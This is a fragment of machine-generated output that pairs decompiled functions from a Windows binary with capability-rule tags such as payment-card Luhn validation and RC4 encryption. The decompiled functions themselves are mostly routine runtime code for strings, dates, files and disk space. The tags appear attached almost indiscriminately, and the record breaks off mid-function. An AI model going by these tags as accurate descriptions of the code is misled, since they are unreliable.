        "decompiled_code": "\nchar * __fastcall fcn.00405b28(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    bool bVar8;\n    \n    if ((param_2 != 0) && (in_EAX != 0)) {\n        iVar5 = *(in_EAX + -4);\n        if ((iVar5 <= *(param_2 + -4)) && (0 < iVar5)) {\n            iVar5 = iVar5 + -1;\n            pcVar6 = *(param_2 + -4) + param_2;\n            pcVar4 = param_2 + iVar5;\n            pcVar2 = in_EAX + iVar5;\n            iVar5 = -iVar5;\n            cVar1 = *pcVar2;\n            if (iVar5 != 0) {\n                pcVar3 = pcVar4;\ncode_r0x00405c00:\n                iVar7 = iVar5;\n                if (cVar1 == *pcVar3) goto code_r0x00405c4f;\ncode_r0x00405c04:\n                iVar7 = iVar5;\n                if (cVar1 == pcVar3[1]) goto code_r0x00405c22;\n                while (pcVar3 = pcVar3 + 2,  pcVar3 < pcVar6 + -2) {\n                    while( true ) {\n                        iVar7 = iVar5;\n                        if (cVar1 == *pcVar3) goto code_r0x00405c4f;\n                        if (cVar1 == pcVar3[1]) goto code_r0x00405c22;\n                        if (cVar1 == pcVar3[2]) {\n                            pcVar3 = pcVar3 + 2;\n                            goto code_r0x00405c4f;\n                        }\n                        if (cVar1 == pcVar3[3]) break;\n                        pcVar3 = pcVar3 + 4;\n                        if (pcVar6 + -2 <= pcVar3) {\n                            if (pcVar6 <= pcVar3) {\n                                return NULL;\n                            }\n                            goto code_r0x00405c00;\n                        }\n                    }\n                    pcVar3 = pcVar3 + 2;\ncode_r0x00405c22:\n                    while (*(pcVar2 + iVar7) == *(pcVar3 + iVar7 + 1)) {\n                        bVar8 = SCARRY4(iVar7, 2);\n                        iVar7 = iVar7 + 2;\n                        if (bVar8 == iVar7 < 0) {\n                            if (pcVar3 + 2 <= pcVar6) {\n                                return pcVar3 + 2 + -pcVar4;\n                            }\n                            return NULL;\n                        }\n                    }\n                }\n                if (pcVar6 <= pcVar3) {\n                    return NULL;\n                }\n                goto code_r0x00405c00;\n            }\n            pcVar2 = pcVar4;\n            while (cVar1 != *pcVar2) {\n                if (cVar1 == pcVar2[1]) {\ncode_r0x00405bbc:\n                    pcVar3 = NULL;\n                    if (pcVar2 + 2 <= pcVar6) {\n                        pcVar3 = pcVar2 + 2 + -pcVar4;\n                    }\n                    return pcVar3;\n                }\n                pcVar2 = pcVar2 + 2;\n                if (pcVar2 < pcVar6 + -2) {\n                    do {\n                        if (cVar1 == *pcVar2) goto code_r0x00405bac;\n                        if (cVar1 == pcVar2[1]) goto code_r0x00405bbc;\n                        if (cVar1 == pcVar2[2]) {\n                            pcVar2 = pcVar2 + 2;\n                            goto code_r0x00405bac;\n                        }\n                        if (cVar1 == pcVar2[3]) {\n                            pcVar2 = pcVar2 + 2;\n                            goto code_r0x00405bbc;\n                        }\n                        pcVar2 = pcVar2 + 4;\n                    } while (pcVar2 < pcVar6 + -2);\n                    if (pcVar6 <= pcVar2) {\n                        return NULL;\n                    }\n                }\n                else if (pcVar6 <= pcVar2) {\n                    return NULL;\n                }\n            }\ncode_r0x00405bac:\n            return pcVar2 + (1 - pcVar4);\n        }\n    }\n    return NULL;\ncode_r0x00405c4f:\n    while (*(pcVar2 + iVar7) == *(pcVar3 + iVar7)) {\n        bVar8 = SCARRY4(iVar7, 2);\n        iVar7 = iVar7 + 2;\n        if (bVar8 == iVar7 < 0) {\n            return pcVar3 + (1 - pcVar4);\n        }\n    }\n    goto code_r0x00405c04;\n}\n",
        "token_count": 1102
    },
    "00405d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405d40(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        if (iVar1 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar1);\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 128
    },
    "00405d8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405d8c(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 1) {\n        fcn.00405d28(param_2);\n    }\n    else if ((param_1 + 1 < 0x7ff) && (iVar1 = fcn.00405670(param_1),  0 < iVar1)) {\n        fcn.00405e18();\n    }\n    else {\n        fcn.00405fa4();\n        fcn.00405670(param_1);\n        fcn.00405fa4();\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00405e3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405e3c(uint param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    char *pcVar2;\n    \n    arg_8h = 0;\n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *pcVar2 != '\\0'; pcVar2 = pcVar2 + 4) {\n            if (pcVar2[1] == '\\0') {\ncode_r0x00405e5d:\n                pcVar2 = pcVar2 + 1;\n                break;\n            }\n            if (pcVar2[2] == '\\0') {\ncode_r0x00405e5c:\n                pcVar2 = pcVar2 + 1;\n                goto code_r0x00405e5d;\n            }\n            if (pcVar2[3] == '\\0') {\n                pcVar2 = pcVar2 + 1;\n                goto code_r0x00405e5c;\n            }\n        }\n        arg_8h = pcVar2 - param_2;\n    }\n    if (arg_8h < 1) {\n        fcn.00405d28(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00405670(arg_8h),  0 < iVar1)) {\n        fcn.00405e18();\n    }\n    else {\n        fcn.00405fa4();\n        fcn.00405670(arg_8h);\n        fcn.00405fa4();\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "00405fa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405fa4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (0 < param_2) {\n        fcn.00405d00();\n        iVar1 = fcn.00405ec8();\n        if (0 < iVar1) {\n            fcn.004030fc();\n        }\n    }\n    fcn.00405d18();\n    return;\n}\n",
        "token_count": 97
    },
    "00405fe8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405fe8(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.00406018();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 123
    },
    "004060ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004060ac(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.004060f8();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 123
    },
    "0040649c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0040649c(uint param_1, int32_t param_2, uint32_t param_3, int32_t param_4)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX * param_3 & 0xffffffff | (in_EAX * param_3 >> 0x20) + param_4 * in_EAX + param_2 * param_3 << 0x20;\n}\n",
        "token_count": 100
    },
    "00406928": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406928(void)\n\n{\n    fcn.0040679c(&stack0x00000004);\n    return;\n}\n",
        "token_count": 31
    },
    "00406998": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.00406998(void)\n\n{\n    uchar *puVar1;\n    uchar auStack28 [4];\n    int32_t iStack24;\n    \n    puVar1 = auStack28;\n    sub.kernel32.dll_VirtualQuery();\n    if (iStack24 != 0x1000) {\n        puVar1 = NULL;\n    }\n    return puVar1;\n}\n",
        "token_count": 84
    },
    "00407550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407550(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack4104 [4096];\n    \n    if (in_EAX != 0) {\n        if (*(in_EAX + 4) < 0x10000) {\n            uVar1 = fcn.00406a10(*(in_EAX + 4), auStack4104, 0x1000);\n            sub.user32.dll_LoadStringA(uVar1);\n            fcn.00405620();\n        }\n        else {\n            fcn.00405728();\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "00407754": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407754(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    *arg_8h = in_EAX;\n    arg_8h[1] = in_EDX;\n    arg_8h[2] = in_ECX + in_EAX;\n    arg_8h[3] = in_EDX + arg_ch;\n    return;\n}\n",
        "token_count": 112
    },
    "0040976c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040976c(uint param_1, uint param_2)\n\n{\n    fcn.0040dbf4(param_1, param_2);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 52
    },
    "004099e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004099e8(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    \n    if (in_EAX == 0) {\n        if (param_2 != 0) {\n            in_EAX = -*(param_2 + -4);\n        }\n        return in_EAX;\n    }\n    if (param_2 == 0) {\n        return *(in_EAX - 4);\n    }\n    uVar4 = *(param_2 + -4);\n    uVar10 = *(in_EAX - 4) - uVar4;\n    iVar6 = (-(*(in_EAX - 4) < uVar4) & uVar10) + uVar4;\n    iVar7 = -iVar6;\n    if (iVar7 != 0) {\n        do {\n            uVar1 = *(iVar7 + iVar6 + in_EAX);\n            uVar4 = uVar1;\n            uVar2 = *(iVar7 + param_2 + iVar6);\n            uVar8 = uVar2;\n            if (uVar4 != uVar8) {\n                if (uVar1 != uVar2) {\n                    uVar4 = uVar1 & 0xff;\n                    uVar8 = uVar2 & 0xff;\n                    cVar3 = uVar1 & 0xff;\n                    if (('`' < cVar3) && (cVar3 < '{')) {\n                        uVar4 = uVar4 - 0x20;\n                    }\n                    cVar3 = uVar2 & 0xff;\n                    if (('`' < cVar3) && (cVar3 < '{')) {\n                        uVar8 = uVar8 - 0x20;\n                    }\n                    if (uVar4 - uVar8 != 0) {\n                        return uVar4 - uVar8;\n                    }\n                    uVar4 = *(iVar7 + iVar6 + in_EAX);\n                    uVar8 = *(iVar7 + param_2 + iVar6);\n                    if (uVar4 >> 8 == uVar8 >> 8) goto code_r0x00409a76;\n                }\n                uVar5 = uVar4 >> 8;\n                uVar9 = uVar8 >> 8;\n                cVar3 = uVar4 >> 8;\n                if (('`' < cVar3) && (cVar3 < '{')) {\n                    uVar5 = uVar5 - 0x20;\n                }\n                cVar3 = uVar8 >> 8;\n                if (('`' < cVar3) && (cVar3 < '{')) {\n                    uVar9 = uVar9 - 0x20;\n                }\n                if (uVar5 - uVar9 != 0) {\n                    return uVar5 - uVar9;\n                }\n            }\ncode_r0x00409a76:\n            bVar11 = SCARRY4(iVar7, 2);\n            iVar7 = iVar7 + 2;\n        } while (bVar11 != iVar7 < 0);\n    }\n    return uVar10;\n}\n",
        "token_count": 754
    },
    "00409d70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409d70(uint param_1, uint param_2)\n\n{\n    fcn.00409d24(param_2);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 46
    },
    "00409d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409d90(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cVar8;\n    \n    if ((param_1 == '\\0') && (param_1 = 10,  (*(in_EAX + 4) & 0x80000000) != 0)) {\n        fcn.00409dc4(-*in_EAX, -(*(in_EAX + 4) + (*in_EAX != 0)));\n        unaff_ESI[-1] = 0x2d;\n        return;\n    }\n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cVar8 = ROUND(fVar6);\n        uVar2 = cVar8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cVar8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 515
    },
    "00409e5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e5c(uint arg_8h)\n\n{\n    fcn.00409d90();\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 40
    },
    "00409e84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409e84(uint param_1)\n\n{\n    fcn.00409d24(param_1);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 41
    },
    "00409eac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409eac(uint arg_8h)\n\n{\n    fcn.00409d90();\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 39
    },
    "00409f70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00409f70(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040676c();\n    if (iVar1 == 0) {\n        fcn.00406928(1);\n        fcn.00405584();\n    }\n    iVar1 = fcn.0040676c();\n    if (iVar1 == 0) {\n        fcn.00406928(1);\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0040a084": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040a084(uint param_1, uchar *param_2)\n\n{\n    uint uVar1;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_10h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    uVar1 = fcn.0040b77c();\n    if (uVar1 == '\\0') {\n        fcn.00409f70();\n        fcn.00406774();\n        uVar1 = fcn.0040a000(arg_8h);\n        if (uVar1 == '\\0') {\n            fcn.00406774();\n            uVar1 = fcn.0040a000(arg_8h_00);\n            if (uVar1 != '\\0') {\n                *param_2 = 0;\n            }\n        }\n        else {\n            *param_2 = 1;\n        }\n    }\n    else {\n        *param_2 = _var_10h != *0x40a104;\n    }\n    return uVar1;\n}\n",
        "token_count": 266
    },
    "0040a3ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a3ac(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpFileTime;\n    uint lpLocalFileTime;\n    uint32_t wFatTime;\n    \n    wFatTime = param_2;\n    iVar1 = sub.kernel32.dll_DosDateTimeToFileTime(param_2 >> 0x10, param_2 & 0xffff, &lpLocalFileTime);\n    if (((iVar1 != 0) && (iVar1 = sub.kernel32.dll_LocalFileTimeToFileTime(&lpLocalFileTime, &lpFileTime),  iVar1 != 0))\n       && (iVar1 = sub.kernel32.dll_SetFileTime(),  iVar1 != 0)) {\n        return 0;\n    }\n    uVar2 = sub.kernel32.dll_GetLastError_1();\n    return uVar2;\n}\n",
        "token_count": 196
    },
    "0040a404": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0040a404(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iStack32;\n    int32_t iStack24;\n    uint *puStack20;\n    uint auStack16 [2];\n    \n    do {\n        puStack20 = auStack16;\n        if ((*(in_EAX + 0x20) & *(in_EAX + 0x18)) == 0) {\n            iStack24 = in_EAX + 0x34;\n            sub.kernel32.dll_FileTimeToLocalFileTime();\n            iStack32 = in_EAX + 2;\n            sub.kernel32.dll_FileTimeToDosDateTime(&iStack24);\n            *(in_EAX + 8) = *(in_EAX + 0x40);\n            *(in_EAX + 0xc) = *(in_EAX + 0x3c);\n            *(in_EAX + 0x10) = *(in_EAX + 0x20);\n            fcn.004057a0();\n            uVar2 = 0;\n            goto code_r0x0040a480;\n        }\n        puStack20 = in_EAX + 0x20;\n        auStack16[0] = *(in_EAX + 0x1c);\n        iVar1 = sub.kernel32.dll_FindNextFileA();\n    } while (iVar1 != 0);\n    uVar2 = sub.kernel32.dll_GetLastError_1();\ncode_r0x0040a480:\n    return CONCAT44(iStack32, uVar2);\n}\n",
        "token_count": 344
    },
    "0040a70c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a70c(void)\n\n{\n    uint uVar1;\n    uchar auStack272 [4];\n    uchar auStack268 [260];\n    \n    uVar1 = fcn.004059dc(0x104, auStack268, auStack272);\n    sub.kernel32.dll_GetFullPathNameA(uVar1);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 85
    },
    "0040a748": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk size"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a748(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    uVar1 = sub.kernel32.dll_GetDiskFreeSpaceA(arg_8h, &var_4h, &var_8h, &var_ch, &var_10h);\n    uVar2 = fcn.0040649c(var_ch, 0);\n    *arg_ch = uVar2;\n    arg_ch[1] = uVar2 >> 0x20;\n    uVar2 = fcn.0040649c(var_10h, 0);\n    *arg_10h = uVar2;\n    arg_10h[1] = uVar2 >> 0x20;\n    return uVar1;\n}\n",
        "token_count": 248
    },
    "0040aabc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.0040aabc(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00402f00();\n    *piVar1 = in_EAX + 4;\n    return piVar1 + 1;\n}\n",
        "token_count": 69
    },
    "0040b68e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b68e(void)\n\n{\n    int32_t unaff_EBP;\n    char *unaff_ESI;\n    uint var_ch;\n    \n    while( true ) {\n        if (*unaff_ESI - 0x3aU < 0xf6) break;\n        *(unaff_EBP + -0xc) = *unaff_ESI - 0x30;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0040b6aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b6aa(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *unaff_ESI;\n    \n    uVar2 = 0;\n    if ((*unaff_ESI == '+') || (*unaff_ESI == '-')) {\n        unaff_ESI = unaff_ESI + 1;\n    }\n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 - 0x3aU < 0xf6) {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n        uVar2 = uVar2 * 10 + (cVar1 - 0x30);\n    } while (uVar2 < 500);\n    return;\n}\n",
        "token_count": 170
    },
    "0040b6e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b6e0(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.0040b0cc(0, 0xf, 0);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 59
    },
    "0040b710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b710(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.0040b0cc(0, 0, 0);\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 56
    },
    "0040b740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0040b740(void)\n\n{\n    char cVar1;\n    unkbyte10 Stack24;\n    \n    fcn.004059dc();\n    cVar1 = fcn.0040b5cc();\n    if (cVar1 == '\\0') {\n        fcn.0040976c();\n    }\n    return Stack24;\n}\n",
        "token_count": 78
    },
    "0040b798": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b798(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.004059dc();\n    cVar1 = fcn.0040b5cc();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0040b7c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b7c4(uint param_1, float *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.004059dc();\n    cVar1 = fcn.0040b5cc();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0040b80c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b80c(double param_1)\n\n{\n    uint64_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    uVar1 = ROUND(param_1 * *0x491894);\n    iStack16 = uVar1;\n    iStack12 = uVar1 >> 0x20;\n    if (uVar1 < 0) {\n        uVar1 = CONCAT44(-(iStack16 != 0) - iStack12, -iStack16);\n        uVar3 = uVar1 % *0x491898;\n        iVar2 = -(uVar1 / *0x491898);\n    }\n    else {\n        iVar2 = uVar1 / *0x491898;\n        uVar3 = uVar1 % *0x491898;\n    }\n    *in_EAX = uVar3;\n    in_EAX[1] = iVar2 + 0xa955a;\n    return;\n}\n",
        "token_count": 233
    },
    "0040b850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0040b850(double *arg_8h, uint arg_ch)\n\n{\n    uint16_t in_AX;\n    uint16_t in_CX;\n    uint16_t in_DX;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((in_AX < 0x18) && (in_DX < 0x3c)) && (in_CX < 0x3c)) && (arg_ch < 1000)) {\n        *arg_8h = (in_AX * 3600000 + in_DX * 60000 + in_CX * 1000 + arg_ch) / *0x40b8bc;\n        var_1h._0_1_ = 1;\n    }\n    return var_1h;\n}\n",
        "token_count": 211
    },
    "0040b8c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040b8c0(uint32_t arg_8h)\n\n{\n    char cVar1;\n    uint var_8h;\n    \n    cVar1 = fcn.0040b850(&var_8h, arg_8h & 0xffff);\n    if (cVar1 == '\\0') {\n        fcn.00409754();\n    }\n    return _var_8h;\n}\n",
        "token_count": 94
    },
    "0040b900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b900(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint in_EDX;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b80c(arg_ch, arg_10h, &var_4h);\n    fcn.00409738(arg_ch);\n    fcn.00409738(in_EDX);\n    fcn.00409738(arg_8h);\n    return;\n}\n",
        "token_count": 107
    },
    "0040ba64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040ba64(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint auStack20 [2];\n    \n    puVar2 = auStack20;\n    cVar1 = fcn.0040b998(auStack20);\n    if (cVar1 == '\\0') {\n        fcn.00409754();\n    }\n    return CONCAT44(auStack20[0], puVar2);\n}\n",
        "token_count": 98
    },
    "0040ba94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040ba94(int16_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int16_t *in_EAX;\n    int32_t iVar4;\n    uint16_t *in_EDX;\n    uint32_t uVar5;\n    int16_t iVar6;\n    uint var_18h;\n    int32_t var_14h;\n    int16_t var_10h;\n    uint16_t var_eh;\n    int16_t *var_ch;\n    uint16_t *var_8h;\n    int16_t *var_4h;\n    \n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    fcn.0040b80c(arg_ch, arg_10h);\n    if (var_14h < 1) {\n        *var_4h = 0;\n        *var_8h = 0;\n        *var_ch = 0;\n        *arg_8h = 0;\n        uVar5 = 0;\n    }\n    else {\n        *arg_8h = var_14h % 7 + 1;\n        iVar6 = 1;\n        for (iVar4 = var_14h + -1; 0x23ab0 < iVar4; iVar4 = iVar4 + -0x23ab1) {\n            iVar6 = iVar6 + 400;\n        }\n        fcn.00409738(&var_eh);\n        if (var_10h == 4) {\n            var_10h = 3;\n            var_eh = var_eh + 0x8eac;\n        }\n        iVar2 = var_10h * 0x68;\n        fcn.00409738(&var_eh);\n        fcn.00409738(&var_eh);\n        if (var_10h == 4) {\n            